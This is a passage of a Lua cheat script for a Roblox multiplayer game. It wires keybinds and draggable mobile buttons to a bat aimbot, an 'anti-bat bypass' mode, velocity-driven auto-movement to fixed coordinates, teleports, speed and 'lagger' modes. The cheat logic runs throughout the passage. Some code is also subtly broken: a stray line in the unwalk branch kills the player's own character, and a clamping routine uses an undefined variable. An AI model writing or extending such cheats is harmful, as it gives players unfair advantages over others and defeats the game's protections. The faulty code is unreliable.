    -- if State.tpBatEnabled then startTpBat() end
    if State.autoLeftEnabled then startAutoLeft() end
    if State.autoRightEnabled then startAutoRight() end
    if State.headlessEnabled then task.delay(0.8, function() _G.BlastApplyHeadless(char) end) end
    if State.korbloxEnabled then task.delay(0.8, function() _G.BlastApplyKorblox(char) end) end
end

CharSetup.run = function(char)
    CharSetup.phase1()
    if CharSetup.phase2(char) then
        CharSetup.phase3(char)
    end
end

-- ============================================================
-- AUTO LEFT / RIGHT
-- ============================================================
local AP_L1     = Vector3.new(-476.48, -6.28, 92.73)
local AP_L2     = Vector3.new(-483.12, -4.95, 94.80)
local AP_L_FACE = Vector3.new(-482.25, -4.96, 92.09)
local AP_R1     = Vector3.new(-476.16, -6.52, 25.62)
local AP_R2     = Vector3.new(-483.06, -5.03, 25.48)
local AP_R_FACE = Vector3.new(-482.06, -6.93, 35.47)

local alConn, arConn = nil, nil
local alPhase, arPhase = 1, 1

stopAutoLeft = function()
    if alConn then alConn:Disconnect(); alConn = nil end; alPhase = 1
    local char = LP.Character; if char then local hum2 = char:FindFirstChildOfClass("Humanoid"); if hum2 then hum2:Move(Vector3.zero, false) end end
    if stackBtnRefs and stackBtnRefs.autoLeft then stackBtnRefs.autoLeft.setOn(false) end
    if mobileButtons and mobileButtons["autoLeft"] then mobileButtons["autoLeft"].setActive(false) end
end
stopAutoRight = function()
    if arConn then arConn:Disconnect(); arConn = nil end; arPhase = 1
    local char = LP.Character; if char then local hum2 = char:FindFirstChildOfClass("Humanoid"); if hum2 then hum2:Move(Vector3.zero, false) end end
    if stackBtnRefs and stackBtnRefs.autoRight then stackBtnRefs.autoRight.setOn(false) end
    if mobileButtons and mobileButtons["autoRight"] then mobileButtons["autoRight"].setActive(false) end
end
startAutoLeft = function()
    if alConn then alConn:Disconnect() end; alPhase = 1
    alConn = RunService.Heartbeat:Connect(function()
        if not State.autoLeftEnabled then return end
        local char = LP.Character; if not char then return end
        local hrp2 = char:FindFirstChild("HumanoidRootPart")
        local hum2 = char:FindFirstChildOfClass("Humanoid")
        if not hrp2 or not hum2 then return end
        local spd = SPD.NS
        if alPhase == 1 then
            local tgt = Vector3.new(AP_L1.X, hrp2.Position.Y, AP_L1.Z)
            if (tgt - hrp2.Position).Magnitude < 1 then
                alPhase = 2
                local d = AP_L2 - hrp2.Position; local mv = Vector3.new(d.X, 0, d.Z).Unit
                hum2:Move(mv, false); hrp2.AssemblyLinearVelocity = Vector3.new(mv.X*spd, hrp2.AssemblyLinearVelocity.Y, mv.Z*spd); return
            end
            local d = AP_L1 - hrp2.Position; local mv = Vector3.new(d.X, 0, d.Z).Unit
            hum2:Move(mv, false); hrp2.AssemblyLinearVelocity = Vector3.new(mv.X*spd, hrp2.AssemblyLinearVelocity.Y, mv.Z*spd)
        elseif alPhase == 2 then
            local tgt = Vector3.new(AP_L2.X, hrp2.Position.Y, AP_L2.Z)
            if (tgt - hrp2.Position).Magnitude < 1 then
                hum2:Move(Vector3.zero, false); hrp2.AssemblyLinearVelocity = Vector3.zero
                State.autoLeftEnabled = false; if alConn then alConn:Disconnect(); alConn = nil end
                alPhase = 1; 
                if stackBtnRefs and stackBtnRefs.autoLeft then stackBtnRefs.autoLeft.setOn(false) end
                if mobileButtons and mobileButtons["autoLeft"] then mobileButtons["autoLeft"].setActive(false) end
                if toggleRefs and toggleRefs.autoLeft then toggleRefs.autoLeft(false, true) end
                if (AP_L_FACE - hrp2.Position).Magnitude > 0.01 then
                    hrp2.CFrame = CFrame.new(hrp2.Position, Vector3.new(AP_L_FACE.X, hrp2.Position.Y, AP_L_FACE.Z))
                end
                return
            end
            local d = AP_L2 - hrp2.Position; local mv = Vector3.new(d.X, 0, d.Z).Unit
            hum2:Move(mv, false); hrp2.AssemblyLinearVelocity = Vector3.new(mv.X*spd, hrp2.AssemblyLinearVelocity.Y, mv.Z*spd)
        end
    end)
end
startAutoRight = function()
    if arConn then arConn:Disconnect() end; arPhase = 1
    arConn = RunService.Heartbeat:Connect(function()
        if not State.autoRightEnabled then return end
        local char = LP.Character; if not char then return end
        local hrp2 = char:FindFirstChild("HumanoidRootPart")
        local hum2 = char:FindFirstChildOfClass("Humanoid")
        if not hrp2 or not hum2 then return end
        local spd = SPD.NS
        if arPhase == 1 then
            local tgt = Vector3.new(AP_R1.X, hrp2.Position.Y, AP_R1.Z)
            if (tgt - hrp2.Position).Magnitude < 1 then
                arPhase = 2
                local d = AP_R2 - hrp2.Position; local mv = Vector3.new(d.X, 0, d.Z).Unit
                hum2:Move(mv, false); hrp2.AssemblyLinearVelocity = Vector3.new(mv.X*spd, hrp2.AssemblyLinearVelocity.Y, mv.Z*spd); return
            end
            local d = AP_R1 - hrp2.Position; local mv = Vector3.new(d.X, 0, d.Z).Unit
            hum2:Move(mv, false); hrp2.AssemblyLinearVelocity = Vector3.new(mv.X*spd, hrp2.AssemblyLinearVelocity.Y, mv.Z*spd)
        elseif arPhase == 2 then
            local tgt = Vector3.new(AP_R2.X, hrp2.Position.Y, AP_R2.Z)
            if (tgt - hrp2.Position).Magnitude < 1 then
                hum2:Move(Vector3.zero, false); hrp2.AssemblyLinearVelocity = Vector3.zero
                State.autoRightEnabled = false; if arConn then arConn:Disconnect(); arConn = nil end
                arPhase = 1; 
                if stackBtnRefs and stackBtnRefs.autoRight then stackBtnRefs.autoRight.setOn(false) end
                if mobileButtons and mobileButtons["autoRight"] then mobileButtons["autoRight"].setActive(false) end
                if toggleRefs and toggleRefs.autoRight then toggleRefs.autoRight(false, true) end
                if (AP_R_FACE - hrp2.Position).Magnitude > 0.01 then
                    hrp2.CFrame = CFrame.new(hrp2.Position, Vector3.new(AP_R_FACE.X, hrp2.Position.Y, AP_R_FACE.Z))
                end
                return
            end
            local d = AP_R2 - hrp2.Position; local mv = Vector3.new(d.X, 0, d.Z).Unit
            hum2:Move(mv, false); hrp2.AssemblyLinearVelocity = Vector3.new(mv.X*spd, hrp2.AssemblyLinearVelocity.Y, mv.Z*spd)
        end
    end)
end

local function setupChar(char)
    SPD.cleanupSpeedPhysics()
    stopDropBrainrot()
    CharSetup.run(char)
    task.spawn(function()
        while not (char and char:FindFirstChild("HumanoidRootPart") and char:FindFirstChildOfClass("Humanoid")) do
            task.wait(0.1)
        end
        SPD.setupMovementAndIndicators(char)
    end)
end
trackConn(LP.CharacterAdded:Connect(setupChar))
if LP.Character then task.spawn(function() setupChar(LP.Character) end) end

-- ============================================================
-- RUNTIME
-- ============================================================
-- (movement handled by the Smoke Hub speed system — SPD.setupMovementAndIndicators)
end



-- ============================================================
-- INPUT
-- ============================================================
do
trackConn(UIS.InputBegan:Connect(function(inp, gp)
    -- If we're listening for a keybind, don't process normal inputs
    if activeKeybindListener or tick() < _G.EmbeerKeybinds.suppressedUntil then return end
    if gp or UIS:GetFocusedTextBox() then return end
    if inp.UserInputType ~= Enum.UserInputType.Keyboard and inp.UserInputType ~= Enum.UserInputType.Gamepad1 then return end
    local kc = inp.KeyCode
    if kc == Enum.KeyCode.Unknown then return end
    for _, key in ipairs({"drop", "aimbot", "tpDown", "carry", "lagger", "batBypass", "batT"}) do
        if Keys[key] ~= Enum.KeyCode.Unknown and kc == Keys[key] then
            _G.EmbeerKeybinds.trigger(key)
            return
        end
    end

    if kc == Keys.carry then
        SPD.toggleCarryMode()
        task.spawn(saveConfig)
    elseif kc == Keys.lagger then
        -- Lagger Toggle: alterna entre Lagger Mode (1) e Lagger Carry (2)
        if SPD.isLaggerCarryOn and SPD.isLaggerCarryOn() then
            SPD.setLaggerNormal(true)
        else
            SPD.setLaggerCarry(true)
        end
    end

    if kc == Keys.drop then runDropBrainrot()
    elseif kc == Keys.tpDown then doTpDown()
    elseif kc == Keys.aimbot then
        State.batAimbotToggled = not State.batAimbotToggled; if toggleRefs.aimbot then toggleRefs.aimbot(State.batAimbotToggled) end
        if State.batAimbotToggled then 
            -- Disable autoLeft and autoRight when aimbot is turned on
            if State.autoLeftEnabled then
                State.autoLeftEnabled = false
                stopAutoLeft()
                if toggleRefs.autoLeft then toggleRefs.autoLeft(false, true) end
                if mobileButtons["autoLeft"] then mobileButtons["autoLeft"].setActive(false) end
            end
            if State.autoRightEnabled then
                State.autoRightEnabled = false
                stopAutoRight()
                if toggleRefs.autoRight then toggleRefs.autoRight(false, true) end
                if mobileButtons["autoRight"] then mobileButtons["autoRight"].setActive(false) end
            end
            pcall(startBatAimbot)
        else 
            stopBatAimbot() 
        end
    elseif kc == Keys.autoLeft then
        State.autoLeftEnabled = not State.autoLeftEnabled; if toggleRefs.autoLeft then toggleRefs.autoLeft(State.autoLeftEnabled) end
        if State.autoLeftEnabled then 
            -- Disable aimbot when autoLeft is turned on
            if State.batAimbotToggled then
                State.batAimbotToggled = false
                stopBatAimbot()
                if toggleRefs.aimbot then toggleRefs.aimbot(false, true) end
                if mobileButtons["batAimbot"] then mobileButtons["batAimbot"].setActive(false) end
                if mobileButtons["batBypass"] then mobileButtons["batBypass"].setActive(false) end
            end
            startAutoLeft() 
        else 
            stopAutoLeft() 
        end
        task.spawn(saveConfig)
    elseif kc == Keys.autoRight then
        State.autoRightEnabled = not State.autoRightEnabled; if toggleRefs.autoRight then toggleRefs.autoRight(State.autoRightEnabled) end
        if State.autoRightEnabled then 
            -- Disable aimbot when autoRight is turned on
            if State.batAimbotToggled then
                State.batAimbotToggled = false
                stopBatAimbot()
                if toggleRefs.aimbot then toggleRefs.aimbot(false, true) end
                if mobileButtons["batAimbot"] then mobileButtons["batAimbot"].setActive(false) end
                if mobileButtons["batBypass"] then mobileButtons["batBypass"].setActive(false) end
            end
            startAutoRight() 
        else 
            stopAutoRight() 
        end
        task.spawn(saveConfig)
    elseif kc == Keys.unwalk then
        State.unwalkEnabled = not State.unwalkEnabled; if toggleRefs.unwalk then toggleRefs.unwalk(State.unwalkEnabled) end
        if State.unwalkEnabled then startUnwalk() else stopUnwalk() end
    local char = LP.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if hum then hum.Health = 0 end
    elseif kc == Keys.guiHide then
        if mainOuter.Visible then
            hideGui()
        else
            showGui()
        end
    end
end))

-- ============================================================
-- MOBILE BUTTONS (VISUAL E LAYOUT DO XZZ DUELS)
-- ============================================================

-- ============================================================
-- Y_out-style mobile button paint (glossy white / accent active)
-- ============================================================
local function miseryYoutGradient(c)
    return ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, c:Lerp(Color3.new(1,1,1), 0.55)),
        ColorSequenceKeypoint.new(0.45, c),
        ColorSequenceKeypoint.new(1.00, c:Lerp(Color3.new(0,0,0), 0.35)),
    })
end

local function paintMiseryMobileBtn(btnFrame, active)
    if not btnFrame then return end
    local bg = btnFrame:FindFirstChild("BtnGrad")
    local label = btnFrame:FindFirstChild("ButtonText") or btnFrame:FindFirstChild("TextLabel")
    local stroke = btnFrame:FindFirstChildOfClass("UIStroke")
    local orange = Color3.fromRGB(235, 35, 45)
    local orangeDeep = Color3.fromRGB(125, 25, 30)
    local orangeSoft = Color3.fromRGB(255, 65, 75)
    if active then
        -- selected: white selectable with red text
        btnFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        if bg then
            bg.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)),
                ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 248, 242)),
                ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 235, 220)),
            })
        end
        if label then
            label.TextColor3 = orange
            label.TextStrokeTransparency = 0.55
        end
        if stroke then
            stroke.Color = Color3.fromRGB(255, 255, 255)
            stroke.Thickness = 2
            stroke.Transparency = 0
        end
    else
        -- idle: vivid red
        btnFrame.BackgroundColor3 = orange
        if bg then
            bg.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 65, 75)),
                ColorSequenceKeypoint.new(0.45, orange),
                ColorSequenceKeypoint.new(1.00, orangeDeep),
            })
        end
        if label then
            label.TextColor3 = Color3.fromRGB(255, 255, 255)
            label.TextStrokeTransparency = 0.4
        end
        if stroke then
            stroke.Color = orangeSoft
            stroke.Thickness = 1.4
            stroke.Transparency = 0.15
        end
    end
end

local function createMobileButtons()
    local playerGui = LP:WaitForChild("PlayerGui", 5) or LP:FindFirstChild("PlayerGui")
    pcall(function()
        local old = playerGui:FindFirstChild("MiseryMobileButtons")
        if old then old:Destroy() end
    end)

    table.clear(mobileButtons)
    mobileButtonsGui = Instance.new("ScreenGui")
    mobileButtonsGui.Name = "MiseryMobileButtons"
    mobileButtonsGui.ResetOnSpawn = false
    mobileButtonsGui.IgnoreGuiInset = true
    mobileButtonsGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    mobileButtonsGui.DisplayOrder = 1000
    mobileButtonsGui.Enabled = not State.hideMobileButtons
    mobileButtonsGui.Parent = playerGui

    local function setButtonActive(btn, state)
        if not btn then return end
        local pressed = btn:GetAttribute("MiseryMobilePressed") == true
        state = (state == true) or pressed
        local visualState = state and "on" or "off"
        if btn:GetAttribute("MiseryMobileVisualState") == visualState then return end
        btn:SetAttribute("MiseryMobileVisualState", visualState)
        paintMiseryMobileBtn(btn, state)
        local holder = btn.Parent
        local glow = holder and holder:FindFirstChild("Glow")
        if glow then
            local gs = glow:FindFirstChildOfClass("UIStroke")
            if gs then
                local accent = (State.colorApi and State.colorApi.getSelected and State.colorApi.getSelected()) or Color3.fromRGB(235, 35, 45)
                gs.Color = accent
                gs.Transparency = state and 0.35 or 1
            end
        end
    end

    local function pulse(btn)
        if not btn then return end
        btn:SetAttribute("MiseryMobilePressed", true)
        setButtonActive(btn, true)
        task.delay(0.18, function()
            if btn and btn.Parent then
                btn:SetAttribute("MiseryMobilePressed", false)
                setButtonActive(btn, false)
            end
        end)
    end

    local function getButtonState(key)
        if key == "batAimbot" then return State.batAimbotToggled == true and (State.aimbotMode or "normal") ~= "antiBatBypass" end
        if key == "batBypass" then return State.batAimbotToggled == true and (State.aimbotMode or "normal") == "antiBatBypass" end
        if key == "tpBat" then return State.snowTpBatEnabled == true end
        if key == "autoLeft" then return State.autoLeftEnabled == true end
        if key == "autoRight" then return State.autoRightEnabled == true end
        if key == "carry" then return SPD.speedMode == true and not SPD.laggerToggled end
        if key == "lagger" then
            if SPD.isLaggerNormalOn then return SPD.isLaggerNormalOn() == true end
            return mobileLaggerVisualMode == "lagger"
        end
        if key == "carryLagger" then
            if SPD.isLaggerCarryOn then return SPD.isLaggerCarryOn() == true end
            return mobileLaggerVisualMode == "carryLagger"
        end
        if key == "drop" then return DROP.active == true end
        return false
    end

    -- Mantem cada botao inteiro dentro da area visivel, inclusive com UIScale.
    local MOBILE_EDGE_PADDING = 8
    local MOBILE_BUTTON_SIZE = 60

    local function getMobileViewport()
        local camera = workspace.CurrentCamera
        if camera and camera.ViewportSize.X > 0 and camera.ViewportSize.Y > 0 then
            return camera.ViewportSize
        end
        if mobileButtonsGui and mobileButtonsGui.AbsoluteSize.X > 0 and mobileButtonsGui.AbsoluteSize.Y > 0 then
            return mobileButtonsGui.AbsoluteSize
        end
        return Vector2.new(800, 600)
    end

    local function positionToPixels(position, viewport)
        return Vector2.new(
            position.X.Scale * viewport.X + position.X.Offset,
            position.Y.Scale * viewport.Y + position.Y.Offset
        )
    end

    local function clampMobileHolder(holder)
        if not holder then return end
        local viewport = getMobileViewport()
        local scale = math.clamp(tonumber(State.mobileButtonScale) or 1, 0.5, 2.5)
        local renderedSize = MOBILE_BUTTON_SIZE * scale
        local current = positionToPixels(holder.Position, viewport)
        local maxX = math.max(MOBILE_EDGE_PADDING, viewport.X - renderedSize - MOBILE_EDGE_PADDING)
        local maxY = math.max(MOBILE_EDGE_PADDING, viewport.Y - renderedSize - MOBILE_EDGE_PADDING)
        holder.Position = UDim2.fromOffset(
            math.clamp(current.X, MOBILE_EDGE_PADDING, maxX),
            math.clamp(current.Y, MOBILE_EDGE_PADDING, maxY)
        )
    end

    local function clampAllMobileHolders()
        local viewport = getMobileViewport()
        local scale = math.clamp(tonumber(State.mobileButtonScale) or 1, 0.5, 2.5)
        local renderedSize = MOBILE_BUTTON_SIZE * scale
        local minX, minY = math.huge, math.huge
        local maxX, maxY = -math.huge, -math.huge
        local holders = {}
        for _, entry in pairs(mobileButtons) do
            local holder = entry and entry.holder
            if holder then
                local pixels = positionToPixels(holder.Position, viewport)
                table.insert(holders, {key = key, holder = holder, pixels = pixels})
                minX = math.min(minX, pixels.X)
                minY = math.min(minY, pixels.Y)
                maxX = math.max(maxX, pixels.X + renderedSize)
                maxY = math.max(maxY, pixels.Y + renderedSize)
            end
        end
        if #holders == 0 then return end

        local left = MOBILE_EDGE_PADDING
        local top = MOBILE_EDGE_PADDING
        local right = viewport.X - MOBILE_EDGE_PADDING
        local bottom = viewport.Y - MOBILE_EDGE_PADDING
        local dx, dy = 0, 0
        if minX < left then dx = left - minX end
        if maxX + dx > right then dx = dx + right - (maxX + dx) end
        if minY < top then dy = top - minY end
        if maxY + dy > bottom then dy = dy + bottom - (maxY + dy) end

        for _, item in ipairs(holders) do
            item.holder.Position = UDim2.fromOffset(item.pixels.X + dx, item.pixels.Y + dy)
            -- Em telas menores que o conjunto inteiro, garante cada opcao visivel.
            clampMobileHolder(item.holder)
            State.mobileButtonPositions[item.key] = _G.BlastPositionToConfig(item.holder.Position)
        end
    end
    _G.BlastClampMobileButtons = clampAllMobileHolders

    local function makeMobileButton(key, label, position, onPress)
        local holder = Instance.new("Frame")
        holder.Name = "MBH_" .. key
        -- Mais estreitos e proporcionais para ocupar menos tela
        holder.Size = UDim2.new(0, 60, 0, 60)
        holder.Position = _G.BlastConfigToPosition(State.mobileButtonPositions[key], position)
        holder.BackgroundTransparency = 1
        holder.BorderSizePixel = 0
        holder.ZIndex = 1000
        holder.Active = true
        holder.Visible = not State.hideMobileButtons
        holder.Parent = mobileButtonsGui

        local holderScale = Instance.new("UIScale")
        holderScale.Name = "MobileButtonScale"
        holderScale.Scale = 1
        holderScale.Parent = holder

        local glow = Instance.new("Frame", holder)
        glow.Name = "Glow"
        glow.Size = UDim2.new(1, 4, 1, 4)
        glow.Position = UDim2.new(0, -2, 0, -2)
        glow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        glow.BackgroundTransparency = 1
        glow.BorderSizePixel = 0
        glow.ZIndex = 1000
        Instance.new("UICorner", glow).CornerRadius = UDim.new(0, 18)
        local glowStroke = Instance.new("UIStroke", glow)
        glowStroke.Color = State.colorApi.getSelected()
        glowStroke.Thickness = 0.8
        glowStroke.Transparency = 1
        glowStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

        local btn = Instance.new("TextButton", holder)
        btn.Name = "MB_" .. key
        btn.Size = UDim2.new(1, 0, 1, 0)
        btn.Position = UDim2.new(0, 0, 0, 0)
        btn.BackgroundColor3 = Color3.fromRGB(235, 35, 45)
        btn.BackgroundTransparency = 0
        btn.BorderSizePixel = 0
        btn.Text = ""
        btn.AutoButtonColor = false
        btn.ZIndex = 1002
        btn.Active = true
        btn.ClipsDescendants = true
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)

        -- Y_out glossy gradient layer
        local btnGrad = Instance.new("UIGradient", btn)
        btnGrad.Name = "BtnGrad"
        btnGrad.Rotation = 90
        btnGrad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 65, 75)),
            ColorSequenceKeypoint.new(0.45, Color3.fromRGB(235, 35, 45)),
            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(125, 25, 30)),
        })

        local buttonText = Instance.new("TextLabel", btn)
        buttonText.Name = "ButtonText"
        buttonText.Size = UDim2.new(1, 0, 1, 0)
        buttonText.BackgroundTransparency = 1
        buttonText.Text = label
        buttonText.TextColor3 = Color3.fromRGB(255, 255, 255)
        buttonText.Font = Enum.Font.GothamBlack
        buttonText.TextSize = 11
        buttonText.TextWrapped = true
        buttonText.ZIndex = 1004
        buttonText.Active = false

        local stroke = Instance.new("UIStroke", btn)
        stroke.Color = Color3.fromRGB(255, 65, 75)
        stroke.Thickness = 1.4
        stroke.Transparency = 0.15
        stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

        local function setActive(state)
            if mobileButtons[key] then mobileButtons[key].active = state == true end
            setButtonActive(btn, state)
        end

        local pressing, dragging = false, false
        local pressPosition, holderStart = nil, nil

        btn.InputBegan:Connect(function(input)
            if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end
            pressing = true
            dragging = false
            pressPosition = input.Position
            holderStart = holder.Position
            btn:SetAttribute("MiseryMobilePressed", true)
            setButtonActive(btn, true)
            pcall(function()
                TweenService:Create(btn, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                    Position = UDim2.new(0, 0, 0, 4),
                    Size = UDim2.new(1, 0, 1, -4),
                }):Play()
            end)
        end)

        btn.InputEnded:Connect(function(input)
            if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end
            local wasDragging = dragging
            if pressing and not dragging and onPress then pcall(onPress, btn) end
            pressing = false
            dragging = false
            if wasDragging then
                clampMobileHolder(holder)
                State.mobileButtonPositions[key] = _G.BlastPositionToConfig(holder.Position)
                task.spawn(saveConfig)
            end
            btn:SetAttribute("MiseryMobilePressed", false)
            pcall(function()
                TweenService:Create(btn, TweenInfo.new(0.10, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                    Position = UDim2.new(0, 0, 0, 0),
                    Size = UDim2.new(1, 0, 1, 0),
                }):Play()
            end)
            task.delay(0.08, function()
                if btn and btn.Parent then setButtonActive(btn, getButtonState(key)) end
            end)
        end)

        trackConn(UIS.InputChanged:Connect(function(input)
            if State.lockMobileButtons or not pressing then return end
            if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then return end
            local delta = input.Position - pressPosition
            if not dragging and (math.abs(delta.X) > 6 or math.abs(delta.Y) > 6) then dragging = true end
            if dragging then
                holder.Position = UDim2.new(
                    holderStart.X.Scale,
                    holderStart.X.Offset + delta.X,
                    holderStart.Y.Scale,
                    holderStart.Y.Offset + delta.Y
                )
                clampMobileHolder(holder)
                State.mobileButtonPositions[key] = _G.BlastPositionToConfig(holder.Position)
            end
        end))

        mobileButtons[key] = {
            holder = holder,
            btn = btn,
            stroke = stroke,
            setActive = setActive,
            active = false,
        }
        setActive(getButtonState(key))
        return btn
    end

    -- Grid compacto: botoes mais estreitos, spacing proporcional
    -- Y_out-sized 60x60 grid
    local x1, x2, x3 = -196, -128, -60
    local y1, y2, y3, y4 = -210, -140, -70, 0
    local defaults = {
        tpBat       = UDim2.new(1, x1, 0.5, y1),
        drop        = UDim2.new(1, x2, 0.5, y1),
        autoLeft    = UDim2.new(1, x3, 0.5, y1),
        batAimbot   = UDim2.new(1, x2, 0.5, y2),
        batBypass   = UDim2.new(1, x1, 0.5, y2),
        autoRight   = UDim2.new(1, x3, 0.5, y2),
        tp          = UDim2.new(1, x2, 0.5, y3),
        carry       = UDim2.new(1, x3, 0.5, y3),
        lagger      = UDim2.new(1, x2, 0.5, y4),
        carryLagger = UDim2.new(1, x3, 0.5, y4),
    }


    makeMobileButton("tpBat", "TP\nBAT", defaults.tpBat, function()
        local on = not (State.snowTpBatEnabled == true)
        State.snowTpBatEnabled = on
        if _G.BlastSnowTpSet then _G.BlastSnowTpSet(on) end
        if toggleRefs and toggleRefs.snowTpBat then pcall(function() toggleRefs.snowTpBat(on, true) end) end
        task.spawn(saveConfig)
    end)

    makeMobileButton("drop", "DROP\nBR", defaults.drop, function(btn)
        runDropBrainrot()
        pulse(btn)
    end)

    makeMobileButton("autoLeft", "AUTO\nLEFT", defaults.autoLeft, function()
        if State.autoLeftEnabled then
            State.autoLeftEnabled = false
            stopAutoLeft()
        else
            State.autoLeftEnabled = true
            if State.batAimbotToggled then
                State.batAimbotToggled = false
                stopBatAimbot()
                if toggleRefs.aimbot then toggleRefs.aimbot(false) end
                if mobileButtons.batAimbot then mobileButtons.batAimbot.setActive(false) end
                if mobileButtons.batBypass then mobileButtons.batBypass.setActive(false) end
            end
            startAutoLeft()
        end
        task.spawn(saveConfig)
    end)

    makeMobileButton("batAimbot", "BAT\nAIMBOT", defaults.batAimbot, function()
        local isOnNormal = State.batAimbotToggled == true and (State.aimbotMode or "normal") ~= "antiBatBypass"
        if isOnNormal then
            State.batAimbotToggled = false
            stopBatAimbot()
            if toggleRefs.aimbot then toggleRefs.aimbot(false) end
        else
            State.aimbotMode = "normal"
            State.batAimbotToggled = true
            if State.autoLeftEnabled then State.autoLeftEnabled = false; stopAutoLeft() end
            if State.autoRightEnabled then State.autoRightEnabled = false; stopAutoRight() end
            stopBatAimbot()
            pcall(startBatAimbot)
            if toggleRefs.aimbot then toggleRefs.aimbot(true) end
        end
        if mobileButtons.batAimbot then mobileButtons.batAimbot.setActive(State.batAimbotToggled == true and (State.aimbotMode or "normal") ~= "antiBatBypass") end
        if mobileButtons.batBypass then mobileButtons.batBypass.setActive(State.batAimbotToggled == true and (State.aimbotMode or "normal") == "antiBatBypass") end
        task.spawn(saveConfig)
    end)

    makeMobileButton("batBypass", "BAT\nBYPASS", defaults.batBypass, function()
        local isOnBypass = State.batAimbotToggled == true and (State.aimbotMode or "normal") == "antiBatBypass"
        if isOnBypass then
            State.batAimbotToggled = false
            stopBatAimbot()
            if toggleRefs.aimbot then toggleRefs.aimbot(false) end
        else
            State.aimbotMode = "antiBatBypass"
            State.batAimbotToggled = true
            if State.autoLeftEnabled then State.autoLeftEnabled = false; stopAutoLeft() end
            if State.autoRightEnabled then State.autoRightEnabled = false; stopAutoRight() end
            stopBatAimbot()
            pcall(startBatAimbot)
            if toggleRefs.aimbot then toggleRefs.aimbot(true) end
        end
        if mobileButtons.batAimbot then mobileButtons.batAimbot.setActive(State.batAimbotToggled == true and (State.aimbotMode or "normal") ~= "antiBatBypass") end
        if mobileButtons.batBypass then mobileButtons.batBypass.setActive(State.batAimbotToggled == true and (State.aimbotMode or "normal") == "antiBatBypass") end
        task.spawn(saveConfig)
    end)

    makeMobileButton("autoRight", "AUTO\nRIGHT", defaults.autoRight, function()
        if State.autoRightEnabled then
            State.autoRightEnabled = false
            stopAutoRight()
        else
            State.autoRightEnabled = true
            if State.batAimbotToggled then
                State.batAimbotToggled = false
                stopBatAimbot()
                if toggleRefs.aimbot then toggleRefs.aimbot(false) end
                if mobileButtons.batAimbot then mobileButtons.batAimbot.setActive(false) end
                if mobileButtons.batBypass then mobileButtons.batBypass.setActive(false) end
            end
            startAutoRight()
        end
        task.spawn(saveConfig)
    end)

    makeMobileButton("tp", "TP\nDOWN", defaults.tp, function(btn)
        doTpDown()
        pulse(btn)
    end)

    makeMobileButton("carry", "CARRY\nSPD", defaults.carry, function()
        SPD.toggleCarryMode()
    end)

    makeMobileButton("lagger", "LAGGER\nMODE", defaults.lagger, function()
        -- Toggle ONLY normal lagger (mode 1). Do not use speedMode proxy.
        local isOn = (SPD.isLaggerNormalOn and SPD.isLaggerNormalOn())
            or (mobileLaggerVisualMode == "lagger")
        if SPD.setLaggerNormal then
            SPD.setLaggerNormal(not isOn)
        elseif SPD.toggleLaggerCycle then
            SPD.toggleLaggerCycle()
        end
    end)

    makeMobileButton("carryLagger", "CARRY\nLAGGER", defaults.carryLagger, function()
        -- Toggle ONLY carry-lagger (mode 2). speedMode is always false under CarrySystem lagger.
        local isOn = (SPD.isLaggerCarryOn and SPD.isLaggerCarryOn())
            or (mobileLaggerVisualMode == "carryLagger")
        if SPD.setLaggerCarry then
            SPD.setLaggerCarry(not isOn)
        else
            if isOn then
                SPD.laggerToggled = false
                SPD.speedMode = false
            else
                SPD.laggerToggled = true
                SPD.laggerLevel = 2
            end
            if SPD.resetMovementState then SPD.resetMovementState() end
            task.spawn(saveConfig)
        end
    end)

    -- Apply / live-update mobile button scale
    local function applyMobileButtonScale(scale)
        scale = math.clamp(tonumber(scale) or 1, 0.5, 2.5)
        State.mobileButtonScale = scale
        for _, entry in pairs(mobileButtons) do
            local holder = entry and entry.holder
            if holder then
                local us = holder:FindFirstChild("MobileButtonScale")
                if us and us:IsA("UIScale") then
                    us.Scale = scale
                end
            end
        end
        task.defer(clampAllMobileHolders)
        local pad = mobileButtonsGui and mobileButtonsGui:FindFirstChild("GroupDragPad")
        if pad then
            local us = pad:FindFirstChild("MobileButtonScale")
            if us and us:IsA("UIScale") then us.Scale = scale end
        end
    end
    _G.BlastApplyMobileButtonScale = applyMobileButtonScale
    applyMobileButtonScale(State.mobileButtonScale or 1)

    -- Invisible pad BETWEEN Lagger Mode and Carry Lagger → drag moves ALL buttons
    do
        local lag = mobileButtons["lagger"] and mobileButtons["lagger"].holder
        local car = mobileButtons["carryLagger"] and mobileButtons["carryLagger"].holder
        local pad = Instance.new("TextButton")
        pad.Name = "GroupDragPad"
        pad.BackgroundTransparency = 1
        pad.Text = ""
        pad.AutoButtonColor = false
        pad.BorderSizePixel = 0
        pad.ZIndex = 999
        pad.Active = true
        pad.Size = UDim2.new(0, 36, 0, 60)
        pad.Parent = mobileButtonsGui
        local padScale = Instance.new("UIScale")
        padScale.Name = "MobileButtonScale"
        padScale.Scale = math.clamp(tonumber(State.mobileButtonScale) or 1, 0.5, 2.5)
        padScale.Parent = pad

        local function placePad()
            if not lag or not lag.Parent or not car or not car.Parent then return end
            local lx = lag.AbsolutePosition.X
            local ly = lag.AbsolutePosition.Y
            local cx = car.AbsolutePosition.X
            local cy = car.AbsolutePosition.Y
            local midX = (lx + cx) / 2 + 12
            local midY = (ly + cy) / 2
            -- Convert screen to offset relative to parent (IgnoreGuiInset ScreenGui)
